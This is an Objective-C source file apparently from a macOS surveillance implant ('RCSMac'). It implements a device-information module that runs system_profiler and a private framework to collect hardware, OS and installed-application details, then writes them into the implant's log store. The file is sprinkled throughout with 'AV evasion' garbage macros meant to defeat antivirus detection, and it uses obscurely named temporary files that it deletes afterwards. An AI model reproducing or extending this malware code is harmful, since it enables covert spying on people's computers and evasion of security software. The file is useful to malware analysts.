//
//  RCSMAgentDevice.m
//  RCSMac
//
//  Created by kiodo on 3/11/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//
#import <dlfcn.h>
#import <objc/objc-class.h>
#import "RCSMAgentDevice.h"
#import "RCSMCommon.h"
#import "RCSMTaskManager.h"

#import "RCSMAVGarbage.h"
#import "RCSMDebug.h"
#import "RCSMLogger.h"

#define PROFILER_TOOL @"/usr/sbin/system_profiler"

NSString *kSPHardwareDataType     = @"SPHardwareDataType";
NSString *kSPApplicationsDataType = @"SPApplicationsDataType";

static __m_MAgentDevice *sharedAgentDevice = nil;

@implementation __m_MAgentDevice

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (__m_MAgentDevice *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedAgentDevice == nil)
    {
      //
      // Assignment is not done here
      //
      [[self alloc] init];
    }
  }
  
  return sharedAgentDevice;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedAgentDevice == nil)
    {
      sharedAgentDevice = [super allocWithZone: aZone];
      
      //
      // Assignment and return on first allocation
      //
      return sharedAgentDevice;
    }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (id)retain
{
  return self;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

- (BOOL)getDeviceInfo
{
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
    // AV evasion: only on release build
    AV_GARBAGE_000
 
    NSData *infoData = nil;
    
    /*
    if (gOSMajor >= 10 && gOSMinor >= 6)
    {*/
        // osx >= 10.9
    NSMutableData *infoSys = (NSMutableData*)[self getSystemProfilerInfo:@"SPSoftwareDataType"];
    NSMutableData *infoHw = (NSMutableData*)[self getSystemProfilerInfo:@"SPHardwareDataType"];
    NSMutableData *infoApp = (NSMutableData*)[self getSystemProfilerInfo:@"SPApplicationsDataType"];
    NSMutableData *tmpData = [[NSMutableData alloc]init];
    if (tmpData != nil)
    {
        [tmpData appendData:infoHw];
        [tmpData appendData:infoSys];
        NSString *appString = @" Applications:\n\n";
        [tmpData appendData:[appString dataUsingEncoding:NSUTF8StringEncoding]];
        [tmpData appendData:infoApp];
    }
    infoData = [[NSData alloc ]initWithData:tmpData];
    [tmpData release];
    [infoSys release];
    [infoHw release];
    [infoApp release];
    if (infoData !=nil)
    {
        [self writeProfilerInfo: infoData];
    }
    /*}
    else
    {
        // the old good way
        infoData = [self getSystemInfoWithType: kSPHardwareDataType];
        if (infoData !=nil)
        {
            [self writeDeviceInfo: infoData];
        }
    }*/
    
    // AV evasion: only on release build
    AV_GARBAGE_005
  
    [infoData release];
  
    // AV evasion: only on release build
    AV_GARBAGE_002
  
    [pool release];
  
    return YES;
}

- (BOOL) filterOut:(NSString *)aPath
{
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    NSArray *pathComponents = [aPath pathComponents];
    
    NSString *first = [pathComponents objectAtIndex:1];
    
    
    if ([first isEqualToString:@"System"] == YES) {
        return YES;
    }
    if ([first isEqualToString:@"Library"] == YES) {
        return YES;
    }
    if ([first isEqualToString:@"usr"] == YES) {
        return YES;
    }
    
    [pool release];
    
    return NO;
}

- (NSData*)parseXml: (NSData*)xmlData
{
    if (xmlData == nil)
    {
        // AV evasion: only on release build
        AV_GARBAGE_000
        
        return nil;
    }
    
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    NSMutableArray *tmpArray = nil;
    NSString *errorDesc;
    NSData *resultData = nil;
    NSMutableString *tmpString = nil;
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    
    NSArray *xmlDictArray =
    (NSArray *)[NSPropertyListSerialization
                propertyListFromData: xmlData
                mutabilityOption: NSPropertyListMutableContainersAndLeaves
                format: nil
                errorDescription: &errorDesc];
    
    tmpString = [[NSMutableString alloc] init];
    
    // AV evasion: only on release build
    AV_GARBAGE_006
    
    if (xmlDictArray == nil)
    {
        // AV evasion: only on release build
        AV_GARBAGE_004
        [pool release];
        return nil;
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_006
    
    int count = [xmlDictArray count];
    if (count > 0)
        tmpArray = [[NSMutableArray alloc] initWithCapacity: count];
 
    // AV evasion: only on release build
    AV_GARBAGE_008
    
    for(int index=0; index < count; index++)
    {
        NSAutoreleasePool *pool2 = [[NSAutoreleasePool alloc] init];
        
        // AV evasion: only on release build
        AV_GARBAGE_004
        
        NSDictionary *tmpDict = (NSDictionary*)[xmlDictArray objectAtIndex: index];

        NSArray *items = (NSArray *)[tmpDict objectForKey:@"_items"];
        int itemsCount = [items count];
        
#ifdef DEBUG_DEVICE
        infoLog(@"items count: %d", itemsCount);
#endif
        for(int i=0; i < itemsCount; i++)
        {
            NSAutoreleasePool *pool3 = [[NSAutoreleasePool alloc] init];
            NSDictionary *tmp = (NSDictionary*)[items objectAtIndex: i];
            NSString *appName = (NSString*)[tmp valueForKey:@"_name"];
            NSString *appVersion = (NSString*)[tmp valueForKey:@"version"];
            NSString *path = (NSString*)[tmp valueForKey:@"path"];
            if ([self filterOut:path] == NO)
            {
#ifdef DEBUG_DEVICE
                infoLog(@"path: %@",path);
#endif
                [tmpString appendString:[NSString stringWithFormat:@"%@ ver. %@\n",appName,appVersion]];
            }
            [pool3 release];
        }
        [pool2 release];
    }
    
    resultData = [[NSData alloc] initWithData: [tmpString dataUsingEncoding:NSUTF8StringEncoding]];
    
    [tmpString release];
    [tmpArray release];
    [pool release];
    
    // AV evasion: only on release build
    AV_GARBAGE_003
 
#ifdef DEBUG_DEVICE
    infoLog(@"end of parseXml");
#endif
    return resultData;
}


- (NSData*)getSystemProfilerInfo:(NSString*)aDataType;
{
#ifdef DEBUG_DEVICE
    infoLog(@"SystemProfiler started: %@", aDataType);
#endif
    
    if (aDataType == nil) {
        return nil;
    }
    
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
    
    NSString *aFilename;
    NSTask *aTask;
    NSArray *arguments;
    NSFileHandle *aFile;
    time_t randTime = 0;
    NSString *profiler = PROFILER_TOOL;
    
    // Create tmp output file
    ctime(&randTime);
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    aFilename = [[NSString alloc] initWithFormat: @"/tmp/29t0502zz%.8d.XXXX", randTime];
    
    // AV evasion: only on release build
    AV_GARBAGE_006
    
    [@"" writeToFile: aFilename
          atomically: YES
            encoding: NSUTF8StringEncoding
               error: nil];
    
    // AV evasion: only on release build
    AV_GARBAGE_007
    
    aFile = [NSFileHandle fileHandleForUpdatingAtPath: aFilename];
    
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    if (aFile == nil)
    {
        // AV evasion: only on release build
        AV_GARBAGE_004
        
        [pool release];
        return nil;
    }
    
    // Running task with options
    aTask = [[NSTask alloc] init];
    
    // AV evasion: only on release build
    AV_GARBAGE_007
    
    if ([aDataType compare:kSPApplicationsDataType] == NSOrderedSame)
    {
        arguments = [NSArray arrayWithObjects:@"-xml", aDataType, nil]; // list applications
    }
    else
    {
        arguments = [NSArray arrayWithObjects: aDataType, nil]; // list sys info
    }
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    [aTask setLaunchPath: profiler];
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    [aTask setArguments: arguments];
    
    // Output file handles
    [aTask setStandardOutput: aFile];
    [aTask setStandardError: aFile];
    
    // AV evasion: only on release build
    AV_GARBAGE_009
    
    // Run and wait
    [aTask launch];
    
    // AV evasion: only on release build
    AV_GARBAGE_008
    
    [aTask waitUntilExit];
    
    int status = [aTask terminationStatus];
    
    [aTask release];
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    NSData *profilerData = nil;
    NSData *resultData = nil;
    
    if (status == 0)
    {
        // AV evasion: only on release build
        AV_GARBAGE_003
        
        [aFile closeFile];
        
        // AV evasion: only on release build
        AV_GARBAGE_005
        if ([aDataType compare:kSPApplicationsDataType] == NSOrderedSame) //list apps
        {
            profilerData = [[NSData alloc] initWithContentsOfFile: aFilename];
            [[NSFileManager defaultManager] removeItemAtPath: aFilename error: nil];

            if (profilerData != nil && [profilerData length])
            {
                // AV evasion: only on release build
                AV_GARBAGE_001
            
                resultData = [self parseXml: profilerData];
            
                // AV evasion: only on release build
                AV_GARBAGE_002
            
                [profilerData release];
            }
        }
        else // list sys info
        {
            resultData = [[NSData alloc] initWithContentsOfFile: aFilename];
        
            // AV evasion: only on release build
            AV_GARBAGE_004
        
            [[NSFileManager defaultManager] removeItemAtPath: aFilename error: nil];
        }
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    [aFilename release];
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    [pool release];
    return resultData;
}

- (NSData*)getSystemInfoWithType: (NSString*)aType
{
  NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSData *retData = nil;
  NSString *systemInfoStrHw = nil;
  NSMutableString *systemInfoStr = nil;
  NSDictionary *hwDict;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  void *handle = dlopen("/System/Library/PrivateFrameworks/SPSupport.framework/Versions/Current/SPSupport", 2);
  
  if (handle == NULL)
  {
    [pool release];
    return nil;
  }
  
  id SPDocumentClass = nil;
  
  SPDocumentClass = objc_getClass("SPDocument");
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  if (SPDocumentClass == nil) 
  {   
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    [pool release];
    return nil;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  id sp = [[SPDocumentClass alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  if (sp == nil) 
  {   
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    [pool release];
    return nil;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  // Setting detail level
  if ([sp respondsToSelector: @selector(setDetailLevel:)])
    [sp performSelector: @selector(setDetailLevel:)
             withObject: (id)1];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  if ([sp respondsToSelector: @selector(reportForDataType:)])
    hwDict = (NSDictionary*)[sp performSelector: @selector(reportForDataType:)
                                     withObject: aType];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  if (hwDict != nil)
  {
    NSArray *items = [hwDict objectForKey: @"_items"];
    
    // AV evasion: only on release build
    AV_GARBAGE_006
    
    if (items != nil)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      if ([sp respondsToSelector: @selector(stringForItem:dataType:)])
      {   
        // AV evasion: only on release build
        AV_GARBAGE_009
  
        systemInfoStrHw = (NSString*)[sp performSelector: @selector(stringForItem:dataType:)
                                            withObject: hwDict
                                            withObject: aType];
        
        // AV evasion: only on release build
        AV_GARBAGE_007
        
        if (systemInfoStrHw != nil)
        {   
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          systemInfoStr = [NSMutableString stringWithFormat:@"\nSoftware:\nMacOS version: %u.%u.%u\n\n",
                                                            gOSMajor, gOSMinor, gOSBugFix];
          [systemInfoStr appendString: systemInfoStrHw];
          
          retData = [[systemInfoStr dataUsingEncoding: NSUTF16LittleEndianStringEncoding] retain];
          
          // AV evasion: only on release build
          AV_GARBAGE_002
          
        }
      }
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_006
    
  }
  
  [pool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  return retData;
}


- (BOOL)writeDeviceInfo: (NSData*)aInfo
{
  NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
  
  NSString *tmpUTF16Info = nil;
  
  if (aInfo == nil)
  {
    [pool release];
    return NO;
  }
  
  __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
  
  BOOL success = [logManager createLog: LOGTYPE_DEVICE
                           agentHeader: nil
                             withLogID: 0];
  
  if (success == TRUE)
  {

    tmpUTF16Info = [[NSString alloc]initWithData: aInfo
                                        encoding: NSUTF16LittleEndianStringEncoding];

    if (tmpUTF16Info == nil)
      tmpUTF16Info =  [[NSString alloc] initWithFormat: @"%@", @"no information"];
  
    NSMutableData *tmpData = 
    (NSMutableData*)[tmpUTF16Info dataUsingEncoding: NSUTF16LittleEndianStringEncoding];

    [tmpUTF16Info release];
    
    if (tmpData == nil) 
    {
      NSString *nullInfo = [[NSString alloc] initWithFormat: @"%@", @"no information"];
      tmpData = (NSMutableData*)[nullInfo dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
      [nullInfo release];
    }
    
    [logManager writeDataToLog: tmpData
                      forAgent: LOGTYPE_DEVICE
                     withLogID: 0];
    
    [logManager closeActiveLog: LOGTYPE_DEVICE
                     withLogID: 0];
  }
  else
  {
//#ifdef DEBUG_DEVICE
//    NSLog(@"%s: error creating logs", __FUNCTION__);
//#endif
  }
  
  [pool release];
  
  return YES;
}

- (BOOL)writeProfilerInfo: (NSData*)aInfo
{
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
    
    if (aInfo == nil)
    {
        [pool release];
        return NO;
    }
    
    NSString *newStr = [[NSString alloc] initWithData:aInfo encoding:NSUTF8StringEncoding];
    
    NSMutableData *data = [[NSMutableData alloc] init];
    if ((data == nil) || (newStr == nil)) {
        [newStr release];
        [pool release];
        return NO;
    }
    
    [data appendData:[newStr dataUsingEncoding:NSUTF16LittleEndianStringEncoding]];
    
    __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
    
    BOOL success = [logManager createLog: LOGTYPE_DEVICE
                             agentHeader: nil
                               withLogID: 0];
    
    if (success == TRUE)
    {
        
        [logManager writeDataToLog: data
                          forAgent: LOGTYPE_DEVICE
                         withLogID: 0];
        
        [logManager closeActiveLog: LOGTYPE_DEVICE
                         withLogID: 0];
    }
    
    [newStr release];
    [data release];
    [pool release];
    
    return YES;
}

- (BOOL)stop
{
  int internalCounter = 0;
  
  [mAgentConfiguration setObject: AGENT_STOP
                          forKey: @"status"];
  
  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
         && internalCounter <= MAX_STOP_WAIT_TIME)
  {
    internalCounter++;
    usleep(100000);
  }
  
  return YES;
}

- (void)start
{
#ifdef DEBUG_DEVICE
    infoLog(@"module device started");
#endif
    
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
  
  [self getDeviceInfo];
  
  [mAgentConfiguration setObject: AGENT_STOPPED
                          forKey: @"status"];
  [outerPool release];
}

- (BOOL)resume
{
  return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (NSMutableDictionary *)mAgentConfiguration
{
  return mAgentConfiguration;
}

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{   
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (aConfiguration != mAgentConfiguration)
  {   
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    [mAgentConfiguration release];
    mAgentConfiguration = [aConfiguration retain];
  }
}

@end
